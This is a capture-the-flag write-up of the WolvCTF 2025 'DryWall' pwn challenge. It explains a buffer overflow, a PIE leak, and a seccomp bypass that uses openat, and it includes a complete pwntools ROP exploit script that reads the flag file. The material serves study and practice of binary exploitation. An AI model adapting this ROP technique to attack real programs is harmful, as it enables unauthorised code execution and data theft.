---
layout: post
title: "DryWall – writeup 🧱🔨 from Wolvctf"
date: 2025-03-23
categories: [PWN]
tags: [userland, pwn, binary-exploitation, ROP]
description: "Detailed writeup of the Drywall challenge from WolvCTF 2025 covering ROP chain development and exploit mitigation bypass."
---

# DryWall – writeup 🧱🔨 from Wolvctf

**Challenge Name**: DryWall
**Category**: Pwn Userland

---

## TL;DR
We bypassed the seccomp , leaked the PIE base, built a ROP chain to `openat`, `read`, and `write` the flag file directly, all while staying within syscall restrictions. Oh, and no `open()` allowed. Time for `openat()` magic.

---
## Disclaimer : Horrible scripting ahead :D

## Peeking at the Source

Here’s the key section from the provided C code:

```c
char name[30];
...
fgets(name, 30, stdin);
printf("Good luck %s <|;)
", name);
printf("%p\n",main);
fgets(buf, 0x256, stdin);
```

**buffer overflow?**

- `char buf[256];` is fed into `fgets(buf, 0x256, stdin);`  
- But 0x256 = 598 bytes are read into a 256-byte buffer. 
- Classic **buffer overflow** and more than enough room to build a ROP chain.

---

## Seccomp

```c
seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve),0);
seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(open),0);
...
seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(process_vm_writev),0);
```

Basically, they blocked:
- `execve`, `open`, `execveat`
- Variants of `readv`, `writev`, `process_vm_*`

But they *didn’t block*:
- `openat`
- `read`
- `write`

We can work with this.

---

## The Plan

Here’s what we need to do:
1. **Leak the PIE base** 
2. **Find or inject the flag file path** – `/home/user/flag.txt`
3. **Build ROP chain** using `openat`, `read`, `write` since `open()` is blocked.
4. **Exploit the buffer overflow** to hijack control flow.

---

## PIE Base Leak

From the binary:

```c
printf("%p\n",main);
```

Nice. They’re handing us the address of `main` post-PIE randomization. With that, we can calculate the binary’s base.

In the exploit:
```python
main_leak = p.recvline().strip()
main_addr = int(main_leak, 16)
main_offset = elf.symbols['main']
binary_base = main_addr - main_offset
```

---

## Injecting the Flag Path

Here’s the fun part – the program asks for your name first.

```c
puts("What is your name, epic H4x0r?");
fgets(name, 30, stdin);
```

We can directly feed `/home/user/flag.txt\0` into the `name` buffer. Since we know `name` is global (`.bss`) and we can compute its runtime address, we just point `openat()` to it.
```
$ objdump -t chall | grep name 
0000000000004050 l     O .bss	000000000000001e              _ZL4name
```

---

## ROP Time – Cracking the Wall

We’re now ready to build our ROP chain.

### openat(AT_FDCWD, name_addr, O_RDONLY)

- `AT_FDCWD` is -100 → `0xffffff9c`
- syscall number for `openat` → 257
- We're using **syscall gadget** (gifted in the binary via `gift()` function!)

### read(3, name_addr, 0x100)

- FD = 3 → file descriptor returned from `openat`

### write(1, name_addr, 0x100)

- Write flag contents to stdout.

ROP chain:
```python
rop += p64(pop_rdi_ret)
rop += p64(AT_FDCWD & 0xffffffffffffffff)
rop += p64(pop_rsi_pop_r15_ret)
rop += p64(name_addr)
rop += p64(0)  # junk for r15
rop += p64(pop_rdx_ret)
rop += p64(O_RDONLY)
rop += p64(pop_rax_ret)
rop += p64(257)  # openat
rop += p64(syscall_ret)

rop += p64(pop_rdi_ret)
rop += p64(3)  
rop += p64(pop_rsi_pop_r15_ret)
rop += p64(name_addr)
rop += p64(0)
rop += p64(pop_rdx_ret)
rop += p64(0x100)
rop += p64(pop_rax_ret)
rop += p64(0)  # syscall read
rop += p64(syscall_ret)

rop += p64(pop_rdi_ret)
rop += p64(1)  
rop += p64(pop_rax_ret)
rop += p64(1)  # syscall write
rop += p64(syscall_ret)
```

---

## Payload Assembly

Buffer overflow kicks in here:

```python
payload = b'A' * 280  # Offset to return address
payload += rop
```

After sending this, we enter **interactive mode** and get the flag.

---

## Complete exploit script:

```python
from pwn import *

context.binary = './chall'
context.arch = 'amd64'
context.log_level = 'info' 

elf = context.binary
p = process(elf.path)
#p = remote('ip_addr', port)
p.recvuntil(b'What is your name, epic H4x0r?\n')
p.sendline(b'/home/user/flag.txt\0') 
p.recvuntil(b'<|;)\n')
main_leak = p.recvline().strip()
main_addr = int(main_leak, 16)
log.info(f"Leaked main address: {hex(main_addr)}")

main_offset = elf.symbols['main']
binary_base = main_addr - main_offset
name_offset = 0x4050
name_addr = binary_base + name_offset
log.info(f"PIE base: {hex(binary_base)}")
log.info(f"name address: {hex(name_addr)}")

# Gadgets
pop_rdi_ret = binary_base + 0x13db
pop_rdx_ret = binary_base + 0x1199
pop_rsi_pop_r15_ret = binary_base + 0x13d9
pop_rax_ret = binary_base + 0x119b
syscall_ret = binary_base + 0x119d

AT_FDCWD = -100  # 0xffffff9c for openat
O_RDONLY = 0

# ROP chain
rop = b''

# openat(AT_FDCWD, name_addr, O_RDONLY)
rop += p64(pop_rdi_ret)
rop += p64(AT_FDCWD & 0xffffffffffffffff)
rop += p64(pop_rsi_pop_r15_ret)
rop += p64(name_addr)
rop += p64(0)  # junk for r15
rop += p64(pop_rdx_ret)
rop += p64(O_RDONLY)
rop += p64(pop_rax_ret)
rop += p64(257)  # openat
rop += p64(syscall_ret)

# read and write
rop += p64(pop_rdi_ret)
rop += p64(3)  
rop += p64(pop_rsi_pop_r15_ret)
rop += p64(name_addr)
rop += p64(0)
rop += p64(pop_rdx_ret)
rop += p64(0x100)
rop += p64(pop_rax_ret)
rop += p64(0)  # syscall read
rop += p64(syscall_ret)

rop += p64(pop_rdi_ret)
rop += p64(1)  
rop += p64(pop_rax_ret)
rop += p64(1)  # syscall write
rop += p64(syscall_ret)

payload = b'A' * 280  
payload += rop

p.sendline(payload)

p.interactive()
```

---

## Flag in Sight! 🎯

Running the exploit...

![exploit screenshot](/assets/images/exploits/drywall.png)

Mission accomplished.

---

## Locally Testing Syscalls

To check if `openat`, `read`, and `write` are functioning correctly, you can run the exploit locally with `strace`:

```bash
strace -f -e trace=openat,read,write python3 local.py
```

Sample output:

```
[pid 124153] openat(-1709061504, "/home/user/flag.txt", O_RDONLY) = 3
[pid 124153] read(3, "{Fake_flag}\n", 256) = 12
[pid 124153] write(1, "{Fake_flag}\nflag.txt\0\n\0\0\0..."..., 256) = 256
[pid 124153] --- SIGSEGV ---
[pid 124154] read(8, "{Fake_flag}\nflag.txt\0\n\0..."..., 4096) = 256
{Fake_flag}
[pid 124154] write(1, "{Fake_flag}"..., ...) = 22
```

This helps verify syscall correctness before trying on remote.

---

